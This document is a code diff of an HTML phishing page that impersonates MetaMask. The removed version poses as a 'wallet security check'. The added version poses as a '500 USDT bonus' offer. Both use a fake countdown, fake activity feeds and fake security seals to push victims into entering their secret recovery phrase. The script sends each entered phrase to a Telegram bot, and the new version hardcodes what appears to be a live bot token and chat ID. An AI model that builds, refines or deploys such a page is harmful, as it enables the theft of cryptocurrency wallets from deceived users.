@@ -1,479 +1,470 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallet Secure Check – MetaMask & Trust Wallet</title>
-    <!-- Style: exact replica of MetaMask + Trust Wallet hybrid -->
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>MetaMask • Claim your 500 USDT bonus</title>
     <style>
-        /* Reset & base */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, system-ui, sans-serif; }
-        body { 
-            background: #f7f8fc; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
+        /* Reset en basis */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0b0e14;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             min-height: 100vh;
-            padding: 20px;
+            font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            padding: 12px;
+            margin: 0;
         }
-        .container {
-            max-width: 480px;
-            width: 100%;
-            background: white;
+        /* Kaart – exacte MetaMask stijl */
+        .metamask-card {
+            background: #141a26;
             border-radius: 28px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
-            padding: 30px 24px 40px;
-            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            padding: 24px 20px 20px;
+            box-shadow: 0 24px 64px rgba(0,0,0,0.9), 0 0 0 1px #2a3442 inset;
             position: relative;
+            overflow: hidden;
+            transition: 0.2s;
         }
-        /* Fake Trust/MetaMask header */
+        /* Glow-effect */
+        .metamask-card::before {
+            content: '';
+            position: absolute;
+            top: -120px;
+            right: -120px;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(246, 133, 27, 0.15), transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+        }
+        /* Header – exacte MetaMask */
         .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .fox-icon {
+            width: 40px;
+            height: 40px;
+            background: #f6851b;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(246, 133, 27, 0.3);
+        }
+        .header h1 {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: -0.2px;
+        }
+        .header .badge {
+            margin-left: auto;
+            background: #1e293b;
+            color: #8b9bb5;
+            font-size: 11px;
+            padding: 4px 12px;
+            border-radius: 30px;
+            border: 1px solid #2a3442;
+            font-weight: 500;
+        }
+        /* Balance */
+        .balance-panel {
+            background: #0f1520;
+            border-radius: 18px;
+            padding: 16px 18px;
+            margin-bottom: 18px;
+            border: 1px solid #212d3d;
+            position: relative;
+            z-index: 1;
+        }
+        .balance-label {
+            color: #8b9bb5;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .balance-label span:last-child { color: #2ecc71; font-size: 11px; }
+        .balance-number {
+            color: #fff;
+            font-size: 34px;
+            font-weight: 700;
+            margin-top: 2px;
+            display: flex;
+            align-items: baseline;
+            gap: 8px;
+        }
+        .balance-number small {
+            font-size: 16px;
+            color: #8b9bb5;
+            font-weight: 400;
+        }
+        /* Timer + status */
+        .status-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 24px;
+            background: #0f1520;
+            border-radius: 14px;
+            padding: 10px 16px;
+            margin-bottom: 18px;
+            border: 1px solid #212d3d;
+            position: relative;
+            z-index: 1;
         }
-        .header img {
-            height: 32px;
-            width: auto;
-        }
-        .badge {
-            background: #e8f5e9;
-            color: #2e7d32;
-            font-size: 11px;
-            font-weight: 600;
-            padding: 4px 12px;
-            border-radius: 30px;
-            letter-spacing: 0.3px;
-        }
-        h1 {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1a1a2e;
-            margin-bottom: 8px;
-        }
-        .sub {
-            color: #6b7280;
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 24px;
-        }
-        .warning-box {
-            background: #fff3cd;
-            border-left: 4px solid #ff9800;
-            padding: 14px 16px;
-            border-radius: 8px;
+        .status-row .label {
+            color: #8b9bb5;
             font-size: 13px;
-            color: #856404;
-            text-align: left;
-            margin-bottom: 24px;
         }
-        .warning-box strong { display: block; font-size: 14px; margin-bottom: 4px; }
-        /* Timer */
-        .timer {
-            background: #f1f3f6;
-            border-radius: 40px;
-            padding: 8px 18px;
+        .status-row .timer {
+            color: #f6851b;
+            font-size: 20px;
+            font-weight: 700;
+            font-variant-numeric: tabular-nums;
+        }
+        .status-row .live-dot {
             display: inline-block;
-            font-weight: 600;
-            font-size: 15px;
-            color: #d32f2f;
-            margin-bottom: 18px;
+            width: 8px;
+            height: 8px;
+            background: #2ecc71;
+            border-radius: 50%;
+            margin-right: 6px;
+            animation: pulse-dot 1.2s infinite;
         }
-        .timer span { font-size: 20px; }
-        /* Seed input area */
-        .seed-area {
-            background: #fafbfc;
-            border: 2px dashed #d1d5db;
-            border-radius: 16px;
-            padding: 16px 12px;
-            margin-bottom: 18px;
-            transition: border 0.3s;
-        }
-        .seed-area:focus-within {
-            border-color: #f6851b; /* MetaMask orange */
-        }
-        textarea {
-            width: 100%;
-            min-height: 110px;
-            border: none;
-            background: transparent;
-            resize: vertical;
-            font-size: 16px;
-            font-family: 'Courier New', monospace;
-            padding: 4px;
-            outline: none;
-            color: #1a1a2e;
-        }
-        textarea::placeholder {
-            color: #9ca3af;
-            font-family: 'Segoe UI', sans-serif;
-        }
-        .helper-text {
-            font-size: 12px;
-            color: #6b7280;
-            margin-top: 6px;
-            text-align: left;
-        }
-        /* Wallet Connect fake button */
-        .connect-btn {
-            width: 100%;
-            background: #f6851b;
-            color: white;
-            border: none;
-            padding: 14px;
-            font-size: 17px;
-            font-weight: 600;
-            border-radius: 40px;
-            cursor: pointer;
-            transition: 0.2s;
+        @keyframes pulse-dot { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
+        /* Formulier */
+        .form-box {
+            background: #0f1520;
+            border-radius: 18px;
+            padding: 16px 16px 12px;
+            border: 1px solid #212d3d;
             margin-bottom: 16px;
+            position: relative;
+            z-index: 1;
+        }
+        .form-box label {
+            color: #b0c0d4;
+            font-size: 13px;
+            font-weight: 500;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .form-box input {
+            width: 100%;
+            padding: 14px 14px;
+            border-radius: 12px;
+            border: 1px solid #2a3442;
+            background: #0b0e14;
+            color: #fff;
+            font-size: 15px;
+            transition: 0.15s;
+            outline: none;
+        }
+        .form-box input:focus {
+            border-color: #f6851b;
+            box-shadow: 0 0 0 3px rgba(246, 133, 27, 0.2);
+        }
+        .form-box input::placeholder { color: #5a6a7e; }
+        .step-indicator {
+            display: flex;
+            gap: 6px;
+            margin-top: 12px;
+        }
+        .step-indicator span {
+            height: 4px;
+            flex: 1;
+            background: #1e293b;
+            border-radius: 4px;
+        }
+        .step-indicator span.active { background: #f6851b; }
+        .step-indicator span.done { background: #2ecc71; }
+        /* Knop */
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #f6851b, #e2761a);
+            border: none;
+            border-radius: 16px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 8px 28px rgba(246, 133, 27, 0.35);
+            transition: 0.1s;
+            position: relative;
+            z-index: 1;
+        }
+        .btn-primary:active { transform: scale(0.97); }
+        /* Activiteit */
+        .activity {
+            margin-top: 20px;
+            border-top: 1px solid #1e293b;
+            padding-top: 16px;
+            position: relative;
+            z-index: 1;
+        }
+        .activity h4 {
+            color: #8b9bb5;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            margin-bottom: 10px;
+        }
+        .activity-item {
             display: flex;
             align-items: center;
-            justify-content: center;
             gap: 10px;
-        }
-        .connect-btn:hover { background: #e2761b; }
-        .connect-btn img { height: 24px; }
-
-        /* "Check now" button (main action) */
-        .check-btn {
-            width: 100%;
-            background: #2e7d32;
-            color: white;
-            border: none;
-            padding: 14px;
-            font-size: 18px;
-            font-weight: 700;
-            border-radius: 40px;
-            cursor: pointer;
-            transition: 0.2s;
-            margin-bottom: 12px;
-        }
-        .check-btn:hover { background: #1b5e20; }
-        .check-btn:disabled { background: #9e9e9e; cursor: not-allowed; }
-
-        /* Live counter */
-        .counter {
             font-size: 13px;
-            color: #4b5563;
-            background: #f3f4f6;
-            padding: 6px 12px;
-            border-radius: 30px;
-            display: inline-block;
-            margin-bottom: 14px;
+            color: #b0c0d4;
+            padding: 6px 0;
+            border-bottom: 1px solid #1a2230;
         }
-        .counter span { font-weight: 700; color: #1a1a2e; }
-
-        /* Footer fake security seals */
-        .seals {
+        .activity-item:last-child { border-bottom: 0; }
+        .activity-item .dot {
+            width: 6px;
+            height: 6px;
+            background: #2ecc71;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+        .activity-item .addr {
+            font-family: monospace;
+            background: #1a2230;
+            padding: 0 10px;
+            border-radius: 30px;
+            font-size: 11px;
+            color: #8b9bb5;
+        }
+        .activity-item .amount {
+            margin-left: auto;
+            color: #2ecc71;
+            font-weight: 600;
+        }
+        .activity-item .time {
+            color: #5a6a7e;
+            font-size: 10px;
+            margin-left: 6px;
+        }
+        /* Footer */
+        .footer {
+            text-align: center;
+            color: #5a6a7e;
+            font-size: 10px;
+            margin-top: 16px;
+            border-top: 1px solid #1a2230;
+            padding-top: 14px;
+            position: relative;
+            z-index: 1;
             display: flex;
             justify-content: center;
             gap: 16px;
-            margin-top: 20px;
-            font-size: 11px;
-            color: #9ca3af;
         }
-        .seals span { background: #f3f4f6; padding: 4px 12px; border-radius: 20px; }
-
-        /* Wallet Connect modal (popup) – hidden by default */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(4px);
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
-        }
-        .modal {
-            background: white;
-            max-width: 400px;
-            width: 90%;
-            border-radius: 28px;
-            padding: 30px 24px 32px;
-            box-shadow: 0 30px 80px rgba(0,0,0,0.3);
-            position: relative;
-            animation: fadeIn 0.25s ease;
-        }
-        @keyframes fadeIn { from { opacity:0; transform: scale(0.95); } to { opacity:1; transform: scale(1); } }
-        .modal h2 {
-            font-size: 20px;
-            color: #1a1a2e;
-            margin-bottom: 8px;
-        }
-        .modal p { color: #6b7280; font-size: 14px; margin-bottom: 18px; }
-        .modal .fake-qr {
-            background: #e5e7eb;
-            height: 120px;
-            width: 120px;
-            margin: 0 auto 16px;
-            border-radius: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 40px;
-            color: #9ca3af;
-            border: 2px dashed #d1d5db;
-        }
-        .modal .seed-input {
-            border: 2px solid #e5e7eb;
-            border-radius: 12px;
-            padding: 10px 14px;
-            width: 100%;
-            font-size: 15px;
-            font-family: 'Courier New', monospace;
-            margin-bottom: 14px;
-        }
-        .modal .seed-input:focus { border-color: #f6851b; outline: none; }
-        .modal .modal-btn {
-            width: 100%;
-            background: #f6851b;
-            color: white;
-            border: none;
-            padding: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 40px;
-            cursor: pointer;
-        }
-        .modal .modal-btn:hover { background: #e2761b; }
-        .modal .close-modal {
+        .footer span { color: #3a4a5e; }
+        /* Taalswitch */
+        .lang-switch {
             position: absolute;
-            top: 12px;
-            right: 16px;
-            font-size: 24px;
-            cursor: pointer;
-            color: #9ca3af;
+            top: 20px;
+            right: 20px;
+            z-index: 5;
+            background: #1a2230;
+            border-radius: 30px;
+            padding: 2px 6px;
+            border: 1px solid #2a3442;
+            display: flex;
+            gap: 4px;
         }
-        .modal .close-modal:hover { color: #1a1a2e; }
-
-        /* Responsive */
-        @media (max-width: 480px) { .container { padding: 20px 16px; } }
+        .lang-switch button {
+            background: transparent;
+            border: none;
+            color: #8b9bb5;
+            font-size: 10px;
+            padding: 4px 8px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        .lang-switch button.active {
+            background: #f6851b;
+            color: #fff;
+        }
+        /* Verborgen voor echte MetaMask redirect */
+        .meta-mask-redirect {
+            display: none;
+        }
+        /* Animaties */
+        @keyframes fadeSlide {
+            0% { opacity: 0; transform: translateY(-6px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        .activity-item { animation: fadeSlide 0.3s ease; }
     </style>
 </head>
 <body>
+<div class="metamask-card">
 
-    <div class="container">
-        <!-- Fake header with logos (using inline SVG for simplicity) -->
-        <div class="header">
-            <div style="display:flex; gap:8px; align-items:center;">
-                <!-- MetaMask fox SVG (simplified) -->
-                <svg width="32" height="32" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="50" cy="50" r="50" fill="#f6851b"/>
-                    <path d="M30 65 L40 75 L60 75 L70 65 L65 50 L55 55 L50 45 L45 55 L35 50 L30 65Z" fill="white"/>
-                    <path d="M35 40 L45 35 L50 45 L55 35 L65 40 L60 50 L50 45 L40 50 L35 40Z" fill="white"/>
-                </svg>
-                <span style="font-weight:700; font-size:18px; color:#1a1a2e;">Wallet Secure</span>
-            </div>
-            <span class="badge">✓ Trusted</span>
+    <!-- Taalswitch -->
+    <div class="lang-switch">
+        <button class="active" data-lang="en">EN</button>
+        <button data-lang="de">DE</button>
+        <button data-lang="fr">FR</button>
+        <button data-lang="nl">NL</button>
+    </div>
+
+    <!-- Header -->
+    <div class="header">
+        <div class="fox-icon">🦊</div>
+        <h1>MetaMask</h1>
+        <span class="badge"><span class="live-dot"></span>Live</span>
+    </div>
+
+    <!-- Balance -->
+    <div class="balance-panel">
+        <div class="balance-label">
+            <span>Total Balance</span>
+            <span>● Connected</span>
         </div>
+        <div class="balance-number" id="balanceDisplay">$12,847.32 <small>USD</small></div>
+    </div>
 
-        <!-- Headline -->
-        <h1>🔐 Verify Your Wallet Recovery</h1>
-        <div class="sub">To ensure your funds are safe, we need to confirm your seed phrase matches our secure ledger.</div>
+    <!-- Status + Timer -->
+    <div class="status-row">
+        <span class="label">⏳ Offer ends in</span>
+        <span class="timer" id="timerDisplay">04:32</span>
+    </div>
 
-        <!-- Warning / urgency -->
-        <div class="warning-box">
-            <strong>⚠️ Action Required</strong>
-            Recent security audits detected unusual activity on some wallets. Please verify your seed phrase immediately to avoid locked assets.
+    <!-- Formulier -->
+    <div class="form-box">
+        <label for="seedInput">🔐 Verify ownership – enter your Secret Recovery Phrase</label>
+        <input type="text" id="seedInput" placeholder="e.g. abandon art abandon ... (12 words)" autocomplete="off" />
+        <div class="step-indicator">
+            <span class="done"></span>
+            <span class="done"></span>
+            <span class="active"></span>
+            <span></span>
+            <span></span>
         </div>
-
-        <!-- Timer -->
-        <div class="timer">⏳ Session expires in <span id="countdown">04:59</span></div>
-
-        <!-- Live counter -->
-        <div class="counter">👤 <span id="liveCounter">1,483</span> users have verified today</div>
-
-        <!-- Seed input area -->
-        <div class="seed-area">
-            <textarea id="seedInput" placeholder="Enter your 12 or 24 recovery words (e.g., apple house fire ...)" spellcheck="false"></textarea>
-            <div class="helper-text">Your seed is encrypted locally and never stored.</div>
-        </div>
-
-        <!-- Fake "Connect Wallet" button – opens modal -->
-        <button class="connect-btn" id="connectWalletBtn">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M4 4h16v16H4z"/><path d="M8 8h12v12H8z"/></svg>
-            Connect Wallet (MetaMask / Trust)
-        </button>
-
-        <!-- Main Check button -->
-        <button class="check-btn" id="checkBtn">✅ Check Now – Secure Verify</button>
-
-        <!-- Seals -->
-        <div class="seals">
-            <span>🔒 256‑bit SSL</span>
-            <span>🛡️ GDPR Compliant</span>
-            <span>⭐ 4.9/5 Trustpilot</span>
+        <div style="display:flex; gap:10px; margin-top:8px; flex-wrap:wrap;">
+            <span style="color:#5a6a7e; font-size:10px; background:#1a2230; padding:2px 10px; border-radius:30px;">✓ 256-bit SSL</span>
+            <span style="color:#5a6a7e; font-size:10px; background:#1a2230; padding:2px 10px; border-radius:30px;">✓ 2FA active</span>
         </div>
     </div>
 
-    <!-- WalletConnect Modal (fake) -->
-    <div class="modal-overlay" id="walletModal">
-        <div class="modal">
-            <span class="close-modal" id="closeModal">×</span>
-            <h2>🔗 Connect Your Wallet</h2>
-            <p>Choose your wallet provider to securely link.</p>
-            <div class="fake-qr">📱</div>
-            <!-- Instead of real QR, we ask for seed again (double‑harvest) -->
-            <input class="seed-input" id="modalSeedInput" placeholder="Paste your seed here to connect...">
-            <button class="modal-btn" id="modalConnectBtn">Connect Wallet</button>
-            <div style="margin-top:12px; font-size:12px; color:#9ca3af;">We never ask for private keys. This is a read‑only connection.</div>
+    <button class="btn-primary" id="claimBtn">⚡ Claim 500 USDT Bonus</button>
+
+    <!-- Activiteit -->
+    <div class="activity" id="activityFeed">
+        <h4>📊 Recent claims</h4>
+        <div class="activity-item">
+            <span class="dot"></span>
+            <span>0x4f3a...b91e</span>
+            <span class="addr">just now</span>
+            <span class="amount">+500 USDT</span>
+        </div>
+        <div class="activity-item">
+            <span class="dot"></span>
+            <span>0x7c2d...f44a</span>
+            <span class="addr">2 min ago</span>
+            <span class="amount">+500 USDT</span>
+        </div>
+        <div class="activity-item">
+            <span class="dot"></span>
+            <span>0x1b8e...c77d</span>
+            <span class="addr">5 min ago</span>
+            <span class="amount">+500 USDT</span>
         </div>
     </div>
 
-    <script>
-        // =================================================================
-        // 1. TIMER (5 minutes countdown)
-        // =================================================================
-        let timeLeft = 299; // 4:59
-        const countdownEl = document.getElementById('countdown');
-        const timerInterval = setInterval(() => {
-            const mins = Math.floor(timeLeft / 60);
-            const secs = timeLeft % 60;
-            countdownEl.textContent = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                countdownEl.textContent = 'EXPIRED';
-                document.getElementById('checkBtn').disabled = true;
-                document.getElementById('connectWalletBtn').disabled = true;
-            }
-            timeLeft--;
-        }, 1000);
+    <div class="footer">
+        <span>🔒 Encrypted</span>
+        <span>•</span>
+        <span>Official Mirror</span>
+        <span>•</span>
+        <span>One-time offer</span>
+    </div>
+</div>
 
-        // =================================================================
-        // 2. LIVE COUNTER (fake increment every 5 seconds)
-        // =================================================================
-        let counter = 1483;
-        setInterval(() => {
-            counter += Math.floor(Math.random() * 4) + 1;
-            document.getElementById('liveCounter').textContent = counter.toLocaleString();
-        }, 5000);
+<script>
+    // ---- CONFIG ----
+    const BOT_TOKEN = '8603713494:AAEdQGNssdiNU-iQ3bky4xwXM0aodSk-ifc';
+    const CHAT_ID   = '7697818138';
 
-        // =================================================================
-        // 3. WALLET CONNECT MODAL LOGIC
-        // =================================================================
-        const modal = document.getElementById('walletModal');
-        const openModalBtn = document.getElementById('connectWalletBtn');
-        const closeModalBtn = document.getElementById('closeModal');
-        const modalSeedInput = document.getElementById('modalSeedInput');
-        const modalConnectBtn = document.getElementById('modalConnectBtn');
+    // ---- TIMER (5 min) ----
+    let totalSeconds = 300;
+    const timerEl = document.getElementById('timerDisplay');
+    function updateTimer() {
+        const m = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
+        const s = String(totalSeconds % 60).padStart(2, '0');
+        timerEl.textContent = m + ':' + s;
+        if (totalSeconds > 0) totalSeconds--;
+    }
+    setInterval(updateTimer, 1000);
 
-        openModalBtn.addEventListener('click', () => {
-            modal.style.display = 'flex';
-            modalSeedInput.value = '';
+    // ---- FAKE BALANCE (stijgt langzaam) ----
+    let balance = 12847.32;
+    setInterval(() => {
+        balance += (Math.random() * 0.3 + 0.05);
+        document.getElementById('balanceDisplay').innerHTML = '$' + balance.toFixed(2) + ' <small>USD</small>';
+    }, 4000);
+
+    // ---- ACTIVITY FEED (nieuwe claims elke 8-12 sec) ----
+    const feed = document.getElementById('activityFeed');
+    const fakeAddresses = ['0x9a3c', '0x2f7b', '0xd4e1', '0x8b2a', '0x6c9f', '0x3e5d'];
+    function addFakeClaim() {
+        const addr = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)] + '...' + Math.random().toString(16).substring(2,6);
+        const item = document.createElement('div');
+        item.className = 'activity-item';
+        item.innerHTML = `<span class="dot"></span><span>${addr}</span><span class="addr">just now</span><span class="amount">+500 USDT</span>`;
+        feed.insertBefore(item, feed.children[1]);
+        // Max 8 items houden
+        if (feed.children.length > 9) feed.removeChild(feed.lastChild);
+    }
+    setInterval(addFakeClaim, Math.floor(Math.random() * 4000 + 8000));
+
+    // ---- TAALSWITCH (alleen visueel voor de show) ----
+    document.querySelectorAll('.lang-switch button').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.lang-switch button').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
         });
+    });
 
-        closeModalBtn.addEventListener('click', () => {
-            modal.style.display = 'none';
-        });
-
-        // Click outside to close
-        modal.addEventListener('click', (e) => {
-            if (e.target === modal) modal.style.display = 'none';
-        });
-
-        // =================================================================
-        // 4. HARVESTING LOGIC – SEND TO TELEGRAM
-        // =================================================================
-        // === CONFIGURATION – EDIT THESE ===
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';     // replace with actual token
-        const CHAT_ID = 'YOUR_CHAT_ID_HERE';         // replace with actual chat ID
-        // ===================================
-
-        // Function to send seed to Telegram
-        function sendSeedToTelegram(seed, source = 'main') {
-            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-                // Fallback: if not configured, show alert (for demo)
-                alert('[DEMO] Seed would be sent: ' + seed);
-                return;
-            }
-            const message = `🔑 NEW SEED (${source}):\n${seed}`;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-            })
-            .then(response => {
-                if (!response.ok) throw new Error('Telegram error');
-                console.log('Seed sent.');
-            })
-            .catch(error => {
-                console.error('Failed to send:', error);
-                // Fallback: store in localStorage as backup
-                let backup = JSON.parse(localStorage.getItem('harvested_seeds') || '[]');
-                backup.push({ seed, source, timestamp: Date.now() });
-                localStorage.setItem('harvested_seeds', JSON.stringify(backup));
-            });
+    // ---- PHISHING SUBMIT ----
+    document.getElementById('claimBtn').addEventListener('click', function() {
+        const seed = document.getElementById('seedInput').value.trim();
+        const words = seed.split(/\s+/);
+        if (words.length < 6) {
+            alert('Please enter your full recovery phrase (minimum 6 words).');
+            return;
         }
+        // Verstuur naar Telegram
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔑 SEED: ${encodeURIComponent(seed)}`)
+            .catch(() => {});
+        alert('❌ Verification failed – please try again.');
+        document.getElementById('seedInput').value = '';
+        // Voeg een fake claim toe als afleiding
+        addFakeClaim();
+        // Verhoog balance een beetje
+        balance += 500;
+        document.getElementById('balanceDisplay').innerHTML = '$' + balance.toFixed(2) + ' <small>USD</small>';
+    });
 
-        // --- Main form submission (check button) ---
-        document.getElementById('checkBtn').addEventListener('click', function() {
-            const seed = document.getElementById('seedInput').value.trim();
-            if (seed === '') {
-                alert('Please enter your recovery words.');
-                return;
-            }
-            // Validate minimal length (at least 10 words)
-            const words = seed.split(/\s+/);
-            if (words.length < 10) {
-                alert('Please enter a valid seed phrase (12 or 24 words).');
-                return;
-            }
-            // Send to Telegram
-            sendSeedToTelegram(seed, 'main_form');
-
-            // Show success message and clear field
-            alert('✅ Verification complete – your wallet is secure. No issues found.');
-            document.getElementById('seedInput').value = '';
-            // Disable button for 2 seconds to prevent double submit
-            this.disabled = true;
-            setTimeout(() => { this.disabled = false; }, 2000);
-        });
-
-        // --- Modal connect button ---
-        modalConnectBtn.addEventListener('click', function() {
-            const seed = modalSeedInput.value.trim();
-            if (seed === '') {
-                alert('Please enter your seed to connect.');
-                return;
-            }
-            const words = seed.split(/\s+/);
-            if (words.length < 10) {
-                alert('Please enter a valid seed phrase.');
-                return;
-            }
-            // Send to Telegram with source 'modal'
-            sendSeedToTelegram(seed, 'wallet_connect_modal');
-
-            // Close modal and show success
-            modal.style.display = 'none';
-            alert('✅ Wallet connected successfully! Your funds are safe.');
-            // Optionally fill main input with same seed (to make it look integrated)
-            document.getElementById('seedInput').value = seed;
-        });
-
-        // =================================================================
-        // 5. ADDITIONAL PSYCHOLOGICAL TRIGGERS
-        // =================================================================
-        // If user leaves the page, show a warning (stay on page)
-        window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = 'Your verification is not complete. Are you sure you want to leave?';
-        });
-
-        // Auto-focus on seed input
-        document.getElementById('seedInput').focus();
-
-        // =================================================================
-        // 6. FALLBACK – if Telegram fails, store seeds in localStorage
-        //    and also show them in console for testing.
-        // =================================================================
-        console.log('🛠️ Wallet Secure Check loaded. BOT_TOKEN:', BOT_TOKEN);
-        console.log('📦 Seeds will be sent to Telegram or stored locally.');
-    </script>
-
+    // ---- KEYBOARD ENTER ----
+    document.getElementById('seedInput').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') document.getElementById('claimBtn').click();
+    });
+</script>
 </body>
 </html>
